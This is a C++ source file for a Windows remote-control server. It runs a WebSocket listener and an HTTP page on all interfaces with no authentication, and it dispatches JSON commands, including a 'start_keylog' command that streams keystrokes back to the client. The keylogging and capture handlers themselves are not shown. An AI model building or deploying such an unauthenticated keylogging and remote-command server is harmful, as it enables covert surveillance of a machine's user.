#include "Server.h"

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#pragma comment(lib, "Iphlpapi.lib")

#include <windows.h>
#include <objidl.h>
#include <gdiplus.h>
#pragma comment(lib, "Gdiplus.lib")
using namespace Gdiplus;
#endif

static RemoteServer *g_instance = nullptr;

// Constructor
RemoteServer::RemoteServer()
{
#ifdef _WIN32
    GdiplusStartupInput gi;

    if (GdiplusStartup((ULONG_PTR *)&m_gdiplusToken, &gi, nullptr) != Ok)
        std::cerr << "[GDI+] Startup failed\n";
#endif

    g_instance = this;

    m_endpoint.init_asio();

    m_endpoint.set_max_message_size(10 * 1024 * 1024);

    m_endpoint.clear_access_channels(websocketpp::log::alevel::all);

    using websocketpp::lib::bind;
    using websocketpp::lib::placeholders::_1;
    using websocketpp::lib::placeholders::_2;

    m_endpoint.set_open_handler(bind(&RemoteServer::onOpen, this, _1));
    m_endpoint.set_close_handler(bind(&RemoteServer::onClose, this, _1));
    m_endpoint.set_message_handler(bind(&RemoteServer::onMessage, this, _1, _2));

    // Register commands in Router
    Router::registerAllHandlers(m_router);
}

RemoteServer::~RemoteServer()
{
#ifdef _WIN32
    GdiplusShutdown(m_gdiplusToken);
#endif
}

// Detect local LAN IP (Windows)
std::string RemoteServer::getLocalIP()
{
#ifdef _WIN32
    ULONG size = 15000;
    IP_ADAPTER_ADDRESSES *addrs = (IP_ADAPTER_ADDRESSES *)malloc(size);

    if (GetAdaptersAddresses(AF_INET,
                             GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_SKIP_MULTICAST,
                             nullptr, addrs, &size) != NO_ERROR)
    {
        free(addrs);
        return "127.0.0.1";
    }

    for (auto *a = addrs; a; a = a->Next)
    {
        if (a->IfType == IF_TYPE_SOFTWARE_LOOPBACK || a->OperStatus != IfOperStatusUp)
            continue;

        for (auto *u = a->FirstUnicastAddress; u; u = u->Next)
        {
            auto *sa = (sockaddr_in *)u->Address.lpSockaddr;
            char ip[INET_ADDRSTRLEN];

            inet_ntop(AF_INET, &sa->sin_addr, ip, sizeof(ip));
            free(addrs);

            return ip;
        }
    }

    free(addrs);
#endif
    return "127.0.0.1";
}

// Run Server
void RemoteServer::run()
{
    const int wsPort = 9002;
    const int httpPort = 8080;

    const std::string host = "0.0.0.0";
    std::string lan = getLocalIP();

    try
    {
        // WebSocket Listen
        m_endpoint.listen(asio::ip::tcp::endpoint(asio::ip::make_address(host), wsPort));
        m_endpoint.start_accept();

        std::cout << "[Server] WebSocket: ws://" << lan << ":" << wsPort << "\n";

        // Start HTTP server in background thread
        HttpServer http(lan, httpPort, "index.html");
        http.start();

        std::cout << "[HTTP] Web:  http://" << lan << ":" << httpPort << "\n";

        // Run WebSocket loop
        m_endpoint.run();
    }
    catch (const std::exception &e)
    {
        std::cerr << "[Server] ERROR: " << e.what() << "\n";
    }
}

// WebSocket Open / Close
void RemoteServer::onOpen(websocketpp::connection_hdl)
{
    std::cout << "[WS] Client connected\n";
}

void RemoteServer::onClose(websocketpp::connection_hdl)
{
    std::cout << "[WS] Client disconnected\n";
}

// WebSocket Message Handler
void RemoteServer::onMessage(websocketpp::connection_hdl hdl, WsServer::message_ptr msg)
{
    try
    {
        json req = json::parse(msg->get_payload());

        // Nếu client gửi lệnh start_keylog → lưu hdl
        if (req.value("command", "") == "start_keylog")
        {
            ProcessHandlers::keylogHdl = hdl;
        }

        json res = Router::dispatch(m_router, req);
        m_endpoint.send(hdl, res.dump(), msg->get_opcode());
    }
    catch (...)
    {
        m_endpoint.send(hdl, R"({"type":"error","message":"invalid json"})",
                        msg->get_opcode());
    }
}

RemoteServer &RemoteServer::instance()
{
    return *g_instance;
}

void RemoteServer::sendToClient(websocketpp::connection_hdl hdl, const std::string &text)
{
    try
    {
        m_endpoint.send(hdl, text, websocketpp::frame::opcode::text);
    }
    catch (...)
    {
    }
}